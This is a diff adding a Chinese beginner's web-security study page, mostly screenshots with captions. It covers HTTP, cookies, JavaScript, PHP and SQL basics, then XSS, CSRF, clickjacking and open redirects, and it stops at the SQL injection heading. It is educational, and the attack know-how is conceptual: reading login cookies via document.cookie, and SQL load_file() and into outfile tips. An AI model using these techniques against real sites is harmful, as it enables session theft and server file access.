@@ -1,0 +1,1563 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="pragma" content="no-cache">
+  <meta http-equiv="cache-control" content="no-cache">
+  <meta http-equiv="expires" content="0">
+  
+  <title>web安全入门 | Flyme</title>
+  <meta name="author" content="西伯利亚狼">
+  
+  <meta name="description" content="奋斗小青年的逆袭之路一直进行中">
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <meta property="og:title" content="web安全入门"/>
+  <meta property="og:site_name" content="Flyme"/>
+
+  
+    <meta property="og:image" content=""/>
+  
+
+  
+    <link rel="alternative" href="/atom.xml" title="Flyme" type="application/atom+xml">
+  
+  
+    <link href="/favicon.png" rel="icon">
+  
+  
+  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+
+  <script src="/js/jquery-2.0.3.min.js"></script>
+
+  <!-- analytics -->
+  
+
+
+
+
+<meta name="generator" content="Hexo 5.0.0"></head>
+
+ <body>  
+  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+    <div class="container">
+      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+		<span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+	  <a class="navbar-brand" href="/">Flyme</a>
+      <div class="collapse navbar-collapse nav-menu">
+		<ul class="nav navbar-nav">
+		  
+		  <li>
+			<a href="/archives" title="All the articles.">
+			  <i class="fa fa-archive"></i>Archives
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/categories" title="All the categories.">
+			  <i class="fa fa-folder"></i>Categories
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/tags" title="All the tags.">
+			  <i class="fa fa-tags"></i>Tags
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/about" title="About me.">
+			  <i class="fa fa-user"></i>About
+			</a>
+		  </li>
+		  
+		</ul>
+      </div>
+    </div> <!-- container -->
+</nav>
+<div class="clearfix"></div>
+
+  <div class="container">
+  	<div class="content">
+    	 
+
+
+	
+		<div class="page-header">
+			<h1> web安全入门</h1>
+		</div>
+	
+
+
+
+<div class="row post">
+	<!-- cols -->
+	
+	<div id="top_meta"></div>
+	<div class="col-md-9">
+	
+
+	<!-- content -->
+	<div class="mypage">		
+	  		
+
+	  <h1 id="1web安全初始阶段"><a href="#1web安全初始阶段" class="headerlink" title="1web安全初始阶段"></a>1web安全初始阶段</h1><a id="more"></a>
+
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569747196481.png" alt="1569747196481">1 web基础知识</p>
+<h2 id="1-web简介"><a href="#1-web简介" class="headerlink" title="1 web简介"></a>1 web简介</h2><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569635618823.png" alt="1569635618823"></p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569635754832.png" alt="1569635754832"></p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569635797672.png" alt="1569635797672"></p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569636336218.png" alt="1569636336218"></p>
+<p><strong>浏览器工作流程</strong></p>
+<p><strong><a target="_blank" rel="noopener" href="http://www.anquanquan.info/">www.anquanquan.info</a></strong></p>
+<p><strong>学习安排</strong></p>
+<p>《中国黑客传说：游走在黑暗中的精灵》</p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569638737643.png" alt="1569638737643"></p>
+<p>web安全比二进制安全容易入手</p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569639325599.png" alt="1569639325599"></p>
+<p>安全知识比较杂</p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569639428753.png" alt="1569639428753"></p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569639561697.png" alt="1569639561697"></p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569639636417.png" alt="1569639636417"></p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569639710350.png" alt="1569639710350"></p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569639680856.png" alt="1569639680856"></p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569639816030.png" alt="1569639816030">    </p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569639916339.png" alt="1569639916339"></p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569640294559.png" alt="1569640294559"></p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569640326199.png" alt="1569640326199"></p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569640452565.png" alt="1569640452565"></p>
+<p>火绒</p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569652174332.png" alt="1569652174332"></p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569653326706.png" alt="1569653326706"></p>
+<h2 id="2-web通信"><a href="#2-web通信" class="headerlink" title="2 web通信"></a>2 web通信</h2><p><strong>URL</strong>：同一资源定位符 uniform resource locator</p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569660448212.png" alt="1569660448212"></p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569660488155.png" alt="1569660488155"></p>
+<p><strong>HTTP</strong>：</p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569660590186.png" alt="1569660590186"></p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569660628232.png" alt="1569660628232"></p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569660701822.png" alt="1569660701822"></p>
+<p><strong>referer：</strong></p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569660778304.png" alt="1569660778304"></p>
+<p><strong>cookie和set-cookie</strong>：</p>
+<h2 id="3-web开发"><a href="#3-web开发" class="headerlink" title="3 web开发"></a>3 web开发</h2><h3 id="1-HTML"><a href="#1-HTML" class="headerlink" title="1  HTML"></a>1  HTML</h3><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569662110503.png" alt="1569662110503"></p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569662286401.png" alt="1569662286401"><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569662371019.png" alt="1569662371019"></p>
+<p>语法</p>
+<p>HTML DOM</p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569662498152.png" alt="1569662498152"></p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569662533575.png" alt="1569662533575"></p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569662548836.png" alt="1569662548836"></p>
+<h3 id="2-JavaScript"><a href="#2-JavaScript" class="headerlink" title="2  JavaScript"></a>2  JavaScript</h3><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569662649645.png" alt="1569662649645"></p>
+<p><strong>在哪些地方可以运行js？</strong></p>
+<ul>
+<li>HTML的<code>&lt;script&gt;&lt;/script&gt;</code>之间</li>
+<li>HTML的事件属性中，如onclick</li>
+</ul>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569662760122.png" alt="1569662760122"></p>
+<ul>
+<li>浏览器的js控制台</li>
+</ul>
+<p>js语法借用了c、java的语法</p>
+<p><strong>js的功能</strong>：</p>
+<ul>
+<li><p>动态效果</p>
+</li>
+<li><p><strong>JavaScript  HTML DOM</strong>：在页面中操作HTML</p>
+</li>
+</ul>
+<p><strong>获取内容</strong>：</p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569662953308.png" alt="1569662953308"></p>
+<p><strong>修改内容</strong>：</p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569663126720.png" alt="1569663126720"></p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569663134317.png" alt="1569663134317"></p>
+<p><strong>动态创建HTML元素内容</strong>:<code>document.write()</code></p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569663406720.png" alt="1569663406720"></p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569663434710.png" alt="1569663434710"></p>
+<p><strong>页面增加点互动</strong>：</p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569663736654.png" alt="1569663736654"></p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569663757057.png" alt="1569663757057"></p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569663770538.png" alt="1569663770538"></p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569663836725.png" alt="1569663836725"></p>
+<ul>
+<li><strong>JavaScript  BOM：</strong></li>
+</ul>
+<p>如果我们想获取浏览器的信息，<strong>操作浏览器</strong>行为怎么办？</p>
+<p>如何让浏览器来<strong>警告</strong>用户？</p>
+<ol>
+<li>警告弹窗alert（）</li>
+<li>确认弹窗confirm（）</li>
+<li>提示弹窗prompt（）</li>
+</ol>
+<p>如何从浏览器获取<strong>用户cookie</strong>？</p>
+<ol>
+<li>cookie：通常是服务器发放给用户客户端的一小段<strong>文本信息</strong></li>
+<li>常见场景：用户输入用户名和密码成功登陆网站后，网站会生成一个cookie给用户，当做<strong>用户凭证</strong></li>
+<li>这个凭证cookie相当于我们的钥匙，我们每次访问网站的时候浏览器都会带上<strong>钥匙（cookie）</strong></li>
+</ol>
+<p><strong>获取</strong>：<code>document.cookie</code></p>
+<p><strong>写入</strong>：<code>document.cookie = &quot;写入值&quot;</code></p>
+<ul>
+<li>其他浏览器获取和操作行为：<ul>
+<li>获取浏览器屏幕信息：<code>(window.)screen</code></li>
+<li>获取/控制用户页面url：(window.)location</li>
+<li>获取访问者浏览器信息：<code>(window.)navigator</code></li>
+<li>操作浏览器窗口：window open,close</li>
+</ul>
+</li>
+</ul>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569667911811.png" alt="1569667911811"></p>
+<h3 id="3-web服务端环境"><a href="#3-web服务端环境" class="headerlink" title="3 web服务端环境"></a>3 web服务端环境</h3><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569669186397.png" alt="1569669186397"></p>
+<p>目前流行的架构：</p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569669250661.png" alt="1569669250661"></p>
+<p>如何搭建一个web服务器？</p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569669600164.png" alt="1569669600164"></p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569669646377.png" alt="1569669646377"></p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569670935474.png" alt="1569670935474"></p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569671104066.png" alt="1569671104066"></p>
+<p>文件放在哪里？</p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569671146376.png" alt="1569671146376"></p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569672289403.png" alt="1569672289403"></p>
+<h3 id="4-SQL"><a href="#4-SQL" class="headerlink" title="4 SQL"></a>4 SQL</h3><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569672457230.png" alt="1569672457230"></p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569672483451.png" alt="1569672483451"></p>
+<p><strong>数据库搭建</strong>：</p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569672512008.png" alt="1569672512008"></p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569672553314.png" alt="1569672553314"></p>
+<p><strong>数据库操作：</strong></p>
+<ul>
+<li>创建：CREATE DATABASE websecurity；</li>
+<li>查看：SHOW databases；</li>
+<li>切换：USE websecurity；</li>
+<li>删除：DROP DATABASE websecurity；</li>
+<li>tips：SQL语句对大小写不敏感，分号作为语句的结束，程序中会自动补充</li>
+</ul>
+<p><strong>数据表操作</strong>:</p>
+<ul>
+<li><p>创建：</p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569673088341.png" alt="1569673088341"></p>
+</li>
+<li><p>查看：SHOW tables；</p>
+</li>
+<li><p>插入：</p>
+</li>
+</ul>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569673131856.png" alt="1569673131856"></p>
+<ul>
+<li><p>查询：SELECT * from teacher</p>
+</li>
+<li><p>order by  、where、union/union all(这个可让重复的全部显示)</p>
+</li>
+<li><p>注释：#  或 –  （双横杠有一个空格） 或 /* …*/</p>
+</li>
+<li><p>常见的内置函数：dababase（）、current_user、load_file()</p>
+</li>
+<li><p>tips：version（）数据库版本、into+outfile写入文件</p>
+</li>
+</ul>
+<h3 id="5-php"><a href="#5-php" class="headerlink" title="5  php"></a>5  php</h3><p>.php文件在服务器处理</p>
+<p><strong>基本组成</strong>：</p>
+<ul>
+<li><p>串接：.(点)</p>
+</li>
+<li><p>脚本范围：<code>&lt;?php  ?&gt;</code></p>
+</li>
+<li><p>注释： //、#、/**/</p>
+</li>
+<li><p>echo和print</p>
+<ul>
+<li>echo语句，一次输出多个</li>
+<li>print为函数，有返回值</li>
+</ul>
+</li>
+</ul>
+<p>  <img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569679401513.png" alt="1569679401513"></p>
+<ul>
+<li>tips：除了<code>$_POST、$_GET</code>接受传值外，还可以用<code>$_REQUEST</code></li>
+</ul>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569679584658.png" alt="1569679584658"></p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569679607141.png" alt="1569679607141"></p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569679647822.png" alt="1569679647822"></p>
+<p><strong>数据库类</strong></p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569681249027.png" alt="1569681249027"></p>
+<h2 id="5-补充"><a href="#5-补充" class="headerlink" title="5 补充"></a>5 补充</h2><p>1 常见浏览器协议</p>
+<h1 id="2-web安全"><a href="#2-web安全" class="headerlink" title="2 web安全"></a>2 web安全</h1><h3 id><a href="#" class="headerlink" title></a></h3><h2 id="1-常见的安全问题"><a href="#1-常见的安全问题" class="headerlink" title="1  常见的安全问题"></a>1  常见的安全问题</h2><ul>
+<li><p>钓鱼：</p>
+<ul>
+<li><p>诱惑性标题</p>
+</li>
+<li><p>仿冒真实网站</p>
+<p>骗取用户账号</p>
+</li>
+<li><p>骗取用户资料</p>
+</li>
+</ul>
+</li>
+<li><p>篡改网页：</p>
+<ul>
+<li>关键字：Hacked by</li>
+<li>搜索引擎语法：<ul>
+<li>Intitle：keyword 标题中含有关键字的网页</li>
+<li>Intext：keyword 正文中含有关键字的网页</li>
+<li>Site：domain在某个域名和子域名下的网页</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>暗链：</p>
+<ul>
+<li>隐藏在网站中链接</li>
+<li>网游/博彩/色情/医疗</li>
+</ul>
+</li>
+</ul>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569719637803.png" alt="1569719637803"></p>
+<ul>
+<li>webshell（常说的后门）：<ul>
+<li>网页</li>
+<li>功能强大</li>
+<li>asp/php/jsp</li>
+<li>后门程序</li>
+</ul>
+</li>
+</ul>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569719699554.png" alt="1569719699554"></p>
+<p>总结：</p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569719806261.png" alt="1569719806261"></p>
+<h2 id="2-常见web漏洞解析"><a href="#2-常见web漏洞解析" class="headerlink" title="2 常见web漏洞解析"></a>2 常见web漏洞解析</h2><h3 id="1-XSS"><a href="#1-XSS" class="headerlink" title="1 XSS"></a>1 XSS</h3><p>全称：Cross Site Script</p>
+<p>中文：跨站脚本</p>
+<p>危害：盗取用户信息、钓鱼、制造蠕虫等</p>
+<p>概念：黑客通过“HTML注入”篡改页面，<strong>插入恶意脚本</strong>，当用户在浏览网页时，实现控制用户浏览器行为的一种攻击方式</p>
+<p>实例讲解：</p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569720183819.png" alt="1569720183819"></p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569720204208.png" alt="1569720204208"></p>
+<h4 id="XSS分类"><a href="#XSS分类" class="headerlink" title="XSS分类"></a>XSS分类</h4><ul>
+<li><p>存储型：访问网站，触发XSS</p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569721684458.png" alt="1569721684458"></p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569721715710.png" alt="1569721715710"></p>
+<p>可以看到存储型是要<strong>写入到数据库中的</strong></p>
+</li>
+<li><p>反射型：访问携带XSS脚本的链接，触发xss</p>
+<ul>
+<li>原理解析：获取参数后，直接输出到客户端，导致XSS</li>
+</ul>
+</li>
+</ul>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569721779487.png" alt="1569721779487"></p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569721866615.png" alt="1569721866615"></p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569723129034.png" alt="1569723129034"></p>
+<p>执行过程：</p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569722028129.png" alt="1569722028129"></p>
+<p>存储型与反射型进行区别：存储型进行两次且需要数据库，而反射型只需要浏览器</p>
+<ul>
+<li>DOM型：访问携带xss脚本的链接，触发xss</li>
+<li>反射型和DOM型的<strong>区别</strong>：<ul>
+<li>DOM型xss是通过<strong>前端JavaScript</strong>，将xss脚本写入到DOM中，触发xss；</li>
+<li>而反射型xss是通过<strong>后端web程序</strong>，将xss脚本写入到响应页面中，浏览器响应页面时才触发xss</li>
+</ul>
+</li>
+</ul>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569722497761.png" alt="1569722497761"></p>
+<p>总结：</p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569725124362.png" alt="1569725124362"></p>
+<h3 id="2-CSRF"><a href="#2-CSRF" class="headerlink" title="2 CSRF"></a>2 CSRF</h3><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569725841217.png" alt="1569725841217"></p>
+<p>全称：Cross-site request forgery</p>
+<p>中文名称：跨站请求伪造</p>
+<p>概念：利用用户已登录的身份，在用户毫不知情的情况下，以用户的名义完成非法操作</p>
+<p>危害：</p>
+<ul>
+<li><p>执行恶意操作（“被转账”、“被发垃圾评论”等）</p>
+</li>
+<li><p>制造蠕虫</p>
+</li>
+<li><p>。。。。。</p>
+</li>
+<li><p>原理分析</p>
+</li>
+</ul>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569726085354.png" alt="1569726085354"></p>
+<p>转账页面</p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569726110660.png" alt="1569726110660"></p>
+<p>抓包了解背后的请求</p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569726191651.png" alt="1569726191651"></p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569726265064.png" alt="1569726265064"></p>
+<h3 id="3-点击劫持"><a href="#3-点击劫持" class="headerlink" title="3 点击劫持"></a>3 点击劫持</h3><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569727112662.png" alt="1569727112662"></p>
+<p>使用<code>iframe</code></p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569727206062.png" alt="1569727206062"></p>
+<p>实例讲解</p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569727706208.png" alt="1569727706208"></p>
+<p>点击按钮后</p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569727727210.png" alt="1569727727210"></p>
+<ul>
+<li>原理分析：<ul>
+<li>隐蔽性较高</li>
+<li>骗取用户操作</li>
+<li>‘UI-覆盖攻击’</li>
+<li>利用iframe或其他标签的属性</li>
+</ul>
+</li>
+</ul>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569727846185.png" alt="1569727846185"></p>
+<h3 id="4-URL跳转"><a href="#4-URL跳转" class="headerlink" title="4 URL跳转"></a>4 URL跳转</h3><ul>
+<li><p>定义：借助未验证的URL跳转，将应用程序引导到不安全的第三方区域，从而导致的安全问题</p>
+</li>
+<li><p>实现方式：</p>
+<ul>
+<li>Header头跳转</li>
+</ul>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569737783451.png" alt="1569737783451"></p>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569737797248.png" alt="1569737797248"></p>
+<ul>
+<li>JavaScript跳转</li>
+</ul>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569737819522.png" alt="1569737819522"></p>
+<ul>
+<li>META标签跳转</li>
+</ul>
+</li>
+</ul>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569737870744.png" alt="1569737870744"></p>
+<ul>
+<li>原理分析</li>
+</ul>
+<p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569737920980.png" alt="1569737920980"></p>
+<h3 id="5-SQL注入"><a href="#5-SQL注入" class="headerlink" title="5 SQL注入"></a>5 SQL注入</h3><p><img src="/2020/07/15/web%E5%AE%89%E5%85%A8%E9%BB%91%E5%AE%A2%E7%99%BD%E5%B8%BD%E5%AD%90/1569738143465.png" alt="1569738143465"></p>
